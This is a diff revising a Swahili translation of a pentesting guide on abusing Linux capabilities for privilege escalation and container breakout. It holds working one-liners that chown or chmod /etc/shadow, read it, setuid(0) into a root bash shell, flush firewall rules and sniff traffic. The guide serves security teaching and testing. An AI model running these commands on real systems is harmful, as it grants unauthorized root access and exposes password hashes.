+**Msimbo wa mbinu hii ulikopwa kutoka maabara ya "Abusing DAC\_OVERRIDE Capability" kutoka** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
 
 ## CAP\_CHOWN
 
-**Hii inamaanisha kuwa niwezekana kubadilisha umiliki wa faili yoyote.**
+**Hii inamaanisha kwamba inawezekana kubadilisha umiliki wa faili yoyote.**
 
 **Mfano na binary**
 
-Tuchukulie kuwa binary ya **`python`** ina uwezo huu, unaweza **kubadilisha** **umiliki** wa faili ya **shadow**, **kubadilisha nenosiri la root**, na kuongeza mamlaka:
+Tuchukulie kwamba binary ya **`python`** ina uwezo huu, unaweza **kubadilisha** **mmiliki** wa faili **shadow**, **kubadilisha nenosiri la root**, na kupandisha haki:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1232,21 +1170,21 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 ## CAP\_FOWNER
 
-**Hii inamaanisha kwamba niwezekana kubadilisha ruhusa ya faili yoyote.**
+**Hii inamaanisha kwamba inawezekana kubadilisha ruhusa za faili yoyote.**
 
 **Mfano na binary**
 
-Ikiwa python ina uwezo huu, unaweza kubadilisha ruhusa ya faili ya kivuli, **kubadilisha nenosiri la root**, na kuongeza mamlaka:
+Ikiwa python ina uwezo huu unaweza kubadilisha ruhusa za faili la kivuli, **kubadilisha nenosiri la root**, na kuongeza mamlaka:
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 ### CAP\_SETUID
 
-**Hii inamaanisha kwamba ni rahisi kuweka kitambulisho cha mtumiaji kinachotumika kwenye mchakato ulioundwa.**
+**Hii inamaanisha kwamba inawezekana kuweka kitambulisho cha mtumiaji kinachofanya kazi cha mchakato ulioanzishwa.**
 
-**Mfano na faili ya binary**
+**Mfano na binary**
 
-Ikiwa python ina **uwezo** huu, unaweza kuitumia kwa urahisi kuongeza mamlaka hadi kwenye akaunti ya msimamizi (root):
+Ikiwa python ina hii **uwezo**, unaweza kuitumia kwa urahisi kuboresha mamlaka hadi root:
 ```python
 import os
 os.setuid(0)
@@ -1263,13 +1201,13 @@ os.system("/bin/bash")
 ```
 ## CAP\_SETGID
 
-**Hii inamaanisha kwamba niwezekana kuweka kitambulisho cha kikundi cha mchakato ulioundwa.**
+**Hii inamaanisha kwamba inawezekana kuweka kitambulisho cha kikundi kinachofanya kazi cha mchakato ulioundwa.**
 
-Kuna faili nyingi unaweza **kubadilisha ili kuongeza mamlaka,** [**unaweza kupata wazo hapa**](payloads-to-execute.md#kubadilisha-faili-ili-kuongeza-mamlaka).
+Kuna faili nyingi ambazo unaweza **kuandika upya ili kupandisha mamlaka,** [**unaweza kupata mawazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Mfano na binary**
 
-Katika kesi hii, unapaswa kutafuta faili za kuvutia ambazo kikundi kinaweza kusoma kwa sababu unaweza kujifanya kuwa kikundi chochote:
+Katika kesi hii unapaswa kutafuta faili za kuvutia ambazo kikundi kinaweza kusoma kwa sababu unaweza kujifanya kuwa kikundi chochote:
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1278,25 +1216,25 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-Marafiki, mara tu utakapopata faili ambayo unaweza kuitumia (kwa kusoma au kuandika) ili kuongeza mamlaka, unaweza **kupata kifaa cha kuingia kwa kujifanya kama kikundi kinachovutia** kwa kutumia:
+Mara tu unapopata faili unayoweza kutumia (kupitia kusoma au kuandika) ili kupandisha hadhi, unaweza **kupata shell ukijifanya kuwa kundi la kuvutia** kwa:
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-Katika kesi hii, kikundi cha shadow kilijifanya ili uweze kusoma faili `/etc/shadow`:
+Katika kesi hii, kundi la shadow lilijitambulisha ili uweze kusoma faili `/etc/shadow`:
 ```bash
 cat /etc/shadow
 ```
-Ikiwa **docker** imefungwa, unaweza **kujifanya** kama **kikundi cha docker** na kuitumia vibaya kuwasiliana na [**socket ya docker** na kuongeza mamlaka](./#writable-docker-socket).
+Ikiwa **docker** imewekwa unaweza **kujifanya** kuwa **kikundi cha docker** na kuitumia kuwasiliana na [**docker socket** na kupandisha mamlaka](./#writable-docker-socket).
 
 ## CAP\_SETFCAP
 
-**Hii inamaanisha kuwa ni rahisi kuweka uwezo kwenye faili na michakato**
+**Hii inamaanisha kwamba inawezekana kuweka uwezo kwenye faili na michakato**
 
-**Mfano na faili ya binary**
+**Mfano na binary**
 
-Ikiwa python ina **uwezo** huu, unaweza kuitumia kwa urahisi kuongeza mamlaka hadi kwa mtumiaji mkuu:
+Ikiwa python ina **uwezo** huu, unaweza kwa urahisi kuutumia kupandisha mamlaka hadi root:
 
 {% code title="setcapability.py" %}
 ```python
@@ -1326,14 +1264,14 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 {% hint style="warning" %}
-Tafadhali kumbuka kuwa ikiwa unaweka uwezo mpya kwa faili ya CAP\_SETFCAP, utapoteza uwezo huu.
+Kumbuka kwamba ikiwa utaweka uwezo mpya kwa binary na CAP\_SETFCAP, utapoteza uwezo huu.
 {% endhint %}
 
-Marafiki wakati unaweka [uwezo wa SETUID](linux-capabilities.md#cap\_setuid) kwenye faili, unaweza kwenda kwenye sehemu yake kuona jinsi ya kuongeza mamlaka.
+Mara tu unapo kuwa na [SETUID capability](linux-capabilities.md#cap\_setuid) unaweza kwenda kwenye sehemu yake kuona jinsi ya kupandisha mamlaka.
 
 **Mfano na mazingira (Docker breakout)**
 
-Kwa chaguo-msingi, uwezo wa **CAP\_SETFCAP unapewa kwa mchakato ndani ya kontena kwenye Docker**. Unaweza kuthibitisha hilo kwa kufanya kitu kama:
+Kwa default uwezo **CAP\_SETFCAP unatolewa kwa mchakato ndani ya kontena katika Docker**. Unaweza kuangalia hilo kwa kufanya kitu kama:
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1345,8 +1283,8 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-Uwezo huu unaruhusu **kutoa uwezo wowote kwa faili za binary**, hivyo tunaweza kufikiria kuhusu **kutoroka** kutoka kwenye chombo kwa **kutumia uwezo mwingine uliovunjika** uliotajwa kwenye ukurasa huu.\
-Hata hivyo, ikiwa utajaribu kutoa uwezo wa CAP\_SYS\_ADMIN na CAP\_SYS\_PTRACE kwa faili ya gdb, utagundua kuwa unaweza kutoa uwezo huo, lakini **faili ya binary haitaweza kutekelezwa baada ya hapo**:
+Hii uwezo inaruhusu **kutoa uwezo mwingine wowote kwa binaries**, hivyo tunaweza kufikiria kuhusu **kutoroka** kutoka kwenye kontena **kwa kutumia mojawapo ya uwezo mwingine wa kuvunja** ulioelezwa kwenye ukurasa huu.\
+Hata hivyo, ukijaribu kutoa kwa mfano uwezo CAP\_SYS\_ADMIN na CAP\_SYS\_PTRACE kwa binary ya gdb, utagundua kwamba unaweza kuwapa, lakini **binary haitakuwa na uwezo wa kutekeleza baada ya hii**:
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1356,25 +1294,25 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-[Kutoka kwa nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Kuruhusiwa: Hii ni **seti ya kikomo kwa uwezo halisi** ambao mchakato unaweza kutumia. Pia ni seti ya kikomo kwa uwezo ambao unaweza kuongezwa kwenye seti ya kurithiwa na mchakato ambao **haujapata uwezo wa CAP\_SETPCAP** kwenye seti yake ya uwezo halisi._\
-Inaonekana kama uwezo ulioruhusiwa unapunguza uwezo ambao unaweza kutumika.\
-Hata hivyo, Docker pia hutoa **CAP\_SETPCAP** kwa chaguo-msingi, kwa hivyo huenda uweze **kuweka uwezo mpya ndani ya uwezo wa kurithiwa**.\
-Hata hivyo, kwenye nyaraka za uwezo huu: _CAP\_SETPCAP: \[…] **ongeza uwezo wowote kutoka kwenye seti ya mipaka ya mchakato unaopiga simu** kwenye seti yake ya kurithiwa_.\
-Inaonekana kama tunaweza kuongeza kwenye seti ya kurithiwa uwezo kutoka kwenye seti ya mipaka. Hii inamaanisha kwamba **hatuwezi kuweka uwezo mpya kama CAP\_SYS\_ADMIN au CAP\_SYS\_PTRACE kwenye seti ya kurithiwa ili kuongeza uwezo wa mamlaka**.
+[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Hii ni **seti ya mipaka kwa uwezo halisi** ambao thread inaweza kuchukua. Pia ni seti ya mipaka kwa uwezo ambao unaweza kuongezwa kwenye seti ya kurithiwa na thread ambayo **haina uwezo wa CAP\_SETPCAP** katika seti yake halisi._\
+Inaonekana kama uwezo wa Permitted unakandamiza wale wanaoweza kutumika.\
+Hata hivyo, Docker pia inatoa **CAP\_SETPCAP** kwa chaguo-msingi, hivyo unaweza kuwa na uwezo wa **kuweka uwezo mpya ndani ya wale wa kurithiwa**.\
+Hata hivyo, katika hati hii ya uwezo: _CAP\_SETPCAP : \[…] **ongeza uwezo wowote kutoka kwenye seti ya mipaka ya thread inayoitisha** kwenye seti yake ya kurithiwa_.\
+Inaonekana kama tunaweza kuongeza tu kwenye seti ya kurithiwa uwezo kutoka kwenye seti ya mipaka. Hii inamaanisha kwamba **hatuwezi kuweka uwezo mpya kama CAP\_SYS\_ADMIN au CAP\_SYS\_PTRACE katika seti ya kurithiwa ili kupandisha mamlaka**.
 
 ## CAP\_SYS\_RAWIO
 
-[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hutoa shughuli kadhaa nyeti ikiwa ni pamoja na upatikanaji wa `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kubadilisha `mmap_min_addr`, upatikanaji wa wito wa mfumo wa `ioperm(2)` na `iopl(2)`, na amri mbalimbali za diski. `FIBMAP ioctl(2)` pia imeamilishwa kupitia uwezo huu, ambao umesababisha matatizo katika [siku za nyuma](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na ukurasa wa mwongozo, hii pia inaruhusu mmiliki kufanya `shughuli mbalimbali za kifaa maalum kwenye vifaa vingine`.
+[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inatoa idadi ya operesheni nyeti ikiwa ni pamoja na ufikiaji wa `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kubadilisha `mmap_min_addr`, ufikiaji wa `ioperm(2)` na `iopl(2)` wito wa mfumo, na amri mbalimbali za diski. `FIBMAP ioctl(2)` pia inaruhusiwa kupitia uwezo huu, ambao umesababisha matatizo katika [zamani](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na ukurasa wa man, hii pia inaruhusu mwenye uwezo kufanya `perform a range of device-specific operations on other devices`.
 
-Hii inaweza kuwa na manufaa kwa **kuongeza mamlaka** na **kuvunja kizuizi cha Docker**.
+Hii inaweza kuwa na manufaa kwa **kupandisha mamlaka** na **Docker breakout.**
 
 ## CAP\_KILL
 
-**Hii inamaanisha kwamba ni rahisi kuua mchakato wowote.**
+**Hii inamaanisha kwamba inawezekana kuua mchakato wowote.**
 
-**Mfano na faili ya binary**
+**Mfano na binary**
 
-Tufikirie faili ya binary ya **`python`** ina uwezo huu. Ikiwa ungekuwa **pia unaweza kubadilisha mipangilio ya huduma au soketi** (au faili yoyote ya mipangilio inayohusiana na huduma) unaweza kuweka mlango nyuma, kisha kuua mchakato unaohusiana na huduma hiyo na kusubiri faili ya mipangilio mpya itekelezwe na mlango nyuma wako.
+Tuchukulie kwamba **`python`** binary ina uwezo huu. Ikiwa unaweza **pia kubadilisha baadhi ya huduma au usanidi wa socket** (au faili yoyote ya usanidi inayohusiana na huduma) faili, unaweza kuingiza nyuma, na kisha kuua mchakato unaohusiana na huduma hiyo na kusubiri faili mpya ya usanidi kutekelezwa na nyuma yako.
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1384,30 +1322,33 @@ os.killpg(pgid, signal.SIGKILL)
 ```
 **Privesc na kill**
 
-Ikiwa una uwezo wa kuuwa na kuna **programu ya node inayotumika kama root** (au kama mtumiaji tofauti), labda unaweza **kupeleka** ishara ya **SIGUSR1** na kufanya iifungue **msanidi wa node** ambapo unaweza kuunganisha.
+Ikiwa una uwezo wa kill na kuna **programu ya node inayoendesha kama root** (au kama mtumiaji tofauti) unaweza labda **kutuma** ishara ya **SIGUSR1** na kuifanya **ifungue debuggger ya node** ambapo unaweza kuungana.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-{% content-ref url="linux-capabilities.md" %}
-[linux-capabilities.md](linux-capabilities.md)
+{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
+[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
 {% endcontent-ref %}
 
 ​
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.
+​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_NET\_BIND\_SERVICE
 
-**Hii inamaanisha kuwa ni rahisi kusikiliza kwenye bandari yoyote (hata kwenye bandari zenye mamlaka).** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.
+**Hii inamaanisha kwamba inawezekana kusikiliza kwenye bandari yoyote (hata zile za kibali).** Huwezi kupandisha mamlaka moja kwa moja kwa kutumia uwezo huu.
 
 **Mfano na binary**
 
-Ikiwa **`python`** ina uwezo huu, itaweza kusikiliza kwenye bandari yoyote na hata kuunganisha kutoka kwenye bandari nyingine yoyote (baadhi ya huduma zinahitaji uhusiano kutoka kwenye bandari maalum za mamlaka)
+Ikiwa **`python`** ina uwezo huu itakuwa na uwezo wa kusikiliza kwenye bandari yoyote na hata kuungana kutoka kwake na bandari nyingine yoyote (huduma zingine zinahitaji muunganisho kutoka kwenye bandari za kibali maalum)
+
+{% tabs %}
+{% tab title="Listen" %}
 ```python
 import socket
 s=socket.socket()
@@ -1420,20 +1361,7 @@ print(output)
 ```
 {% endtab %}
 
-{% tab title="Connect" %}Weka uhusiano na mfumo wa malengo kwa kutumia njia zifuatazo:
-
-- **SSH**: Tumia amri `ssh` kuingia kwenye mfumo wa malengo kwa kutumia kitambulisho cha SSH.
-- **RDP**: Tumia amri `xfreerdp` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya RDP.
-- **VNC**: Tumia amri `vncviewer` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya VNC.
-- **Telnet**: Tumia amri `telnet` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya Telnet.
-- **FTP**: Tumia amri `ftp` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya FTP.
-- **SMB**: Tumia amri `smbclient` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya SMB.
-- **HTTP**: Tumia kivinjari cha wavuti kufikia mfumo wa malengo kupitia itifaki ya HTTP.
-- **HTTPS**: Tumia kivinjari cha wavuti kufikia mfumo wa malengo kupitia itifaki ya HTTPS.
-- **WinRM**: Tumia amri `winrm` kuingia kwenye mfumo wa malengo kwa kutumia itifaki ya WinRM.
-- **SSH Tunnel**: Tumia amri `ssh` kuunda handaki la SSH kuelekeza trafiki ya itifaki nyingine kwenye mfumo wa malengo.
-
-Kumbuka kurekebisha amri kulingana na mazingira yako na maelezo ya mfumo wa malengo.
+{% tab title="Unganisha" %}
 ```python
 import socket
 s=socket.socket()
@@ -1445,22 +1373,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unaruhusu michakato kuunda soketi za RAW na PACKET, ikiruhusu kutengeneza na kutuma pakiti za mtandao za aina yoyote. Hii inaweza kusababisha hatari za usalama katika mazingira ya kontena, kama vile kudanganya pakiti, kuingiza trafiki, na kuzunguka udhibiti wa upatikanaji wa mtandao. Watendaji wa uovu wanaweza kutumia hii kuingilia kati na ujumbe wa kontena au kuhatarisha usalama wa mtandao wa mwenyeji, haswa bila ulinzi wa kutosha wa kifaa cha moto. Zaidi ya hayo, **CAP_NET_RAW** ni muhimu kwa kontena zenye mamlaka kuunga mkono shughuli kama vile ping kupitia ombi za ICMP za aina ya RAW.
+[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unaruhusu michakato **kuunda RAW na PACKET sockets**, ikiwaruhusu kuzalisha na kutuma pakiti za mtandao zisizo na mpangilio. Hii inaweza kusababisha hatari za usalama katika mazingira ya kontena, kama vile kupotosha pakiti, kuingiza trafiki, na kupita udhibiti wa ufikiaji wa mtandao. Waigizaji wabaya wanaweza kutumia hii kuingilia kati mwelekeo wa kontena au kuhatarisha usalama wa mtandao wa mwenyeji, hasa bila ulinzi wa moto wa kutosha. Zaidi ya hayo, **CAP_NET_RAW** ni muhimu kwa kontena zenye mamlaka kusaidia operesheni kama ping kupitia maombi ya RAW ICMP.
 
-**Hii inamaanisha kuwa ni rahisi kusikiliza trafiki.** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.
+**Hii inamaanisha kwamba inawezekana kunasa trafiki.** Huwezi kuongeza mamlaka moja kwa moja kwa uwezo huu.
 
 **Mfano na binary**
 
-Ikiwa binary **`tcpdump`** ina uwezo huu, utaweza kutumia kuikamata habari ya mtandao.
+Ikiwa binary **`tcpdump`** ina uwezo huu utaweza kuutumia kunasa taarifa za mtandao.
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-Tafadhali kumbuka kuwa ikiwa **mazingira** yanatoa uwezo huu, unaweza pia kutumia **`tcpdump`** kusikiliza trafiki.
+Kumbuka kwamba ikiwa **muktadha** unatoa uwezo huu unaweza pia kutumia **`tcpdump`** kunasa trafiki.
 
 **Mfano na binary 2**
 
-Mfano ufuatao ni msimbo wa **`python2`** ambao unaweza kuwa na manufaa katika kuvuruga trafiki ya kiolesura cha "**lo**" (**localhost**). Msimbo huu umetoka kwenye maabara "_The Basics: CAP-NET\_BIND + NET\_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
+Mfano ufuatao ni **`python2`** msimbo ambao unaweza kuwa na manufaa kunasa trafiki ya kiolesura cha "**lo**" (**localhost**). Msimbo huu unatoka kwenye maabara "_Misingi: CAP-NET\_BIND + NET\_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
 ```python
 import socket
 import struct
@@ -1506,11 +1434,11 @@ count=count+1
 ```
 ## CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
-[Uwezo wa CAP\_NET\_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html) unawapa mmiliki uwezo wa **kubadilisha mipangilio ya mtandao**, ikiwa ni pamoja na mipangilio ya firewall, meza za mwelekeo, ruhusa za soketi, na mipangilio ya kiolesura cha mtandao ndani ya majina ya nafasi ya mtandao yaliyofichuliwa. Pia inawezesha kuwasha **hali ya kusikiliza** kwenye vipengele vya mtandao, kuruhusu uchunguzi wa pakiti kote kwenye majina ya nafasi.
+[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) uwezo unampa mwenyewe nguvu ya **kubadilisha mipangilio ya mtandao**, ikiwa ni pamoja na mipangilio ya firewall, meza za routing, ruhusa za socket, na mipangilio ya kiunganishi cha mtandao ndani ya majina ya mtandao yaliyofichuliwa. Pia inaruhusu kuwasha **modo wa promiscuous** kwenye viunganishi vya mtandao, ikiruhusu kunasa pakiti kupitia majina ya mtandao.
 
-**Mfano na faili ya binary**
+**Mfano na binary**
 
-Tuchukulie kuwa faili ya **python binary** ina uwezo huu.
+Hebu tuone kwamba **python binary** ina uwezo huu.
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1524,11 +1452,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP\_LINUX\_IMMUTABLE
 
-**Hii inamaanisha kuwa niwezekana kubadilisha sifa za inode.** Hauwezi kuongeza mamlaka moja kwa moja na uwezo huu.
+**Hii inamaanisha kwamba inawezekana kubadilisha sifa za inode.** Huwezi kupandisha mamlaka moja kwa moja na uwezo huu.
 
 **Mfano na binary**
 
-Ikiwa unagundua kuwa faili ni isiyo badilika na python ina uwezo huu, unaweza **kuondoa sifa ya isiyo badilika na kufanya faili iweze kubadilishwa:**
+Ikiwa unapata kwamba faili ni immutable na python ina uwezo huu, unaweza **kuondoa sifa ya immutable na kufanya faili iweze kubadilishwa:**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1552,7 +1480,7 @@ f=open("/path/to/file.sh",'a+')
 f.write('New content for the file\n')
 ```
 {% hint style="info" %}
-Tafadhali kumbuka kuwa kawaida sifa hii isiyoweza kubadilishwa huwekwa na kuondolewa kwa kutumia:
+Kumbuka kwamba kawaida sifa hii isiyoweza kubadilishwa huwekwa na kuondolewa kwa kutumia:
 ```bash
 sudo chattr +i file.txt
 sudo chattr -i file.txt
@@ -1561,45 +1489,45 @@ sudo chattr -i file.txt
 
 ## CAP\_SYS\_CHROOT
 
-[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inawezesha utekelezaji wa wito wa mfumo wa `chroot(2)`, ambao unaweza kuruhusu kutoroka kutoka kwa mazingira ya `chroot(2)` kupitia udhaifu uliojulikana:
+[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inaruhusu utekelezaji wa `chroot(2)` system call, ambayo inaweza kuruhusu kutoroka kutoka kwa mazingira ya `chroot(2)` kupitia udhaifu unaojulikana:
 
-* [Jinsi ya kutoroka kutoka kwa suluhisho tofauti za chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
-* [chw00t: chombo cha kutoroka kutoka chroot](https://github.com/earthquake/chw00t/)
+* [Jinsi ya kutoroka kutoka kwa suluhisho mbalimbali za chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
+* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
 
 ## CAP\_SYS\_BOOT
 
-[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sio tu inaruhusu utekelezaji wa wito wa mfumo wa `reboot(2)` kwa ajili ya kuanzisha upya mfumo, ikiwa ni pamoja na amri maalum kama `LINUX_REBOOT_CMD_RESTART2` iliyoundwa kwa jukwaa fulani la vifaa, lakini pia inawezesha matumizi ya `kexec_load(2)` na, kutoka Linux 3.17 kuendelea, `kexec_file_load(2)` kwa ajili ya kupakia mifumo ya kuyumba mpya au iliyosainiwa mtawaliwa.
+[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) si tu inaruhusu utekelezaji wa `reboot(2)` system call kwa ajili ya kuanzisha upya mfumo, ikiwa ni pamoja na amri maalum kama `LINUX_REBOOT_CMD_RESTART2` iliyoundwa kwa ajili ya majukwaa fulani ya vifaa, lakini pia inaruhusu matumizi ya `kexec_load(2)` na, kuanzia Linux 3.17, `kexec_file_load(2)` kwa ajili ya kupakia nyuklia mpya au zilizotiwa saini.
 
 ## CAP\_SYSLOG
 
-[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) iligawanywa kutoka **CAP_SYS_ADMIN** pana katika Linux 2.6.37, ikiruhusu hasa matumizi ya wito wa `syslog(2)`. Uwezo huu unawezesha kuangalia anwani za kernel kupitia `/proc` na interfaces kama hizo wakati mipangilio ya `kptr_restrict` iko kwenye 1, ambayo inadhibiti ufunuo wa anwani za kernel. Tangu Linux 2.6.39, chaguo-msingi kwa `kptr_restrict` ni 0, maana anwani za kernel zinafunuliwa, ingawa usambazaji wengi huiweka kwenye 1 (ficha anwani isipokuwa kutoka kwa uid 0) au 2 (ficha anwani daima) kwa sababu za usalama.
+[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ilitengwa kutoka kwa **CAP_SYS_ADMIN** kwa ujumla katika Linux 2.6.37, ikitoa uwezo wa kutumia `syslog(2)` call. Uwezo huu unaruhusu kuona anwani za kernel kupitia `/proc` na interfaces zinazofanana wakati mipangilio ya `kptr_restrict` iko kwenye 1, ambayo inasimamia kufichuliwa kwa anwani za kernel. Kuanzia Linux 2.6.39, chaguo-msingi kwa `kptr_restrict` ni 0, ikimaanisha anwani za kernel zinakabiliwa, ingawa usambazaji mwingi huweka hii kuwa 1 (ficha anwani isipokuwa kutoka uid 0) au 2 (daima ficha anwani) kwa sababu za usalama.
 
-Zaidi ya hayo, **CAP_SYSLOG** inaruhusu kupata matokeo ya `dmesg` wakati `dmesg_restrict` imewekwa kwenye 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** inaendelea kuwa na uwezo wa kufanya operesheni za `syslog` kutokana na mifano ya kihistoria.
+Zaidi ya hayo, **CAP_SYSLOG** inaruhusu kufikia matokeo ya `dmesg` wakati `dmesg_restrict` imewekwa kuwa 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** inabaki na uwezo wa kufanya operesheni za `syslog` kutokana na mifano ya kihistoria.
 
 ## CAP\_MKNOD
 
-[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inapanua utendaji wa wito wa mfumo wa `mknod` zaidi ya kuunda faili za kawaida, FIFO (mabomba yaliyopewa majina), au soketi za uwanja wa UNIX. Hasa inaruhusu kuunda faili maalum, ambazo ni pamoja na:
+[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inapanua kazi ya `mknod` system call zaidi ya kuunda faili za kawaida, FIFOs (mabomba yenye majina), au UNIX domain sockets. Inaruhusu hasa kuunda faili maalum, ambazo zinajumuisha:
 
-- **S_IFCHR**: Faili maalum ya wahusika, ambayo ni vifaa kama vituo vya mawasiliano.
-- **S_IFBLK**: Faili maalum ya kuzuia, ambayo ni vifaa kama diski.
+- **S_IFCHR**: Faili maalum za wahusika, ambazo ni vifaa kama terminal.
+- **S_IFBLK**: Faili maalum za block, ambazo ni vifaa kama diski.
 
-Uwezo huu ni muhimu kwa michakato ambayo inahitaji uwezo wa kuunda faili za kifaa, kurahisisha mwingiliano wa moja kwa moja na vifaa vya vifaa kupitia vifaa vya wahusika au vifaa vya kuzuia.
+Uwezo huu ni muhimu kwa michakato inayohitaji uwezo wa kuunda faili za vifaa, ikirahisisha mwingiliano wa moja kwa moja na vifaa kupitia vifaa vya wahusika au block.
 
-Hii ni uwezo wa msingi wa docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
+Ni uwezo wa chombo cha default ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Uwezo huu unaruhusu kufanya uongezaji wa haki za kibali (kupitia kusoma diski kamili) kwenye mwenyeji, chini ya hali zifuatazo:
+Uwezo huu unaruhusu kufanya kupandisha hadhi (kupitia kusoma diski kamili) kwenye mwenyeji, chini ya masharti haya:
 
-1. Kuwa na ufikiaji wa awali kwa mwenyeji (bila haki za kibali).
-2. Kuwa na ufikiaji wa awali kwa kontena (yenye haki za kibali (EUID 0), na uwezo wa `CAP_MKNOD`).
-3. Mwenyeji na kontena wanapaswa kushiriki nafasi ya mtumiaji sawa.
+1. Kuwa na ufikiaji wa awali kwa mwenyeji (Bila hadhi).
+2. Kuwa na ufikiaji wa awali kwa chombo (Bila hadhi (EUID 0), na `CAP_MKNOD` inayofaa).
+3. Mwenyeji na chombo vinapaswa kushiriki namespace sawa ya mtumiaji.
 
-**Hatua za Kuunda na Kupata Kifaa cha Kuzuia kwenye Kontena:**
+**Hatua za Kuunda na Kufikia Kifaa cha Block katika Chombo:**
 
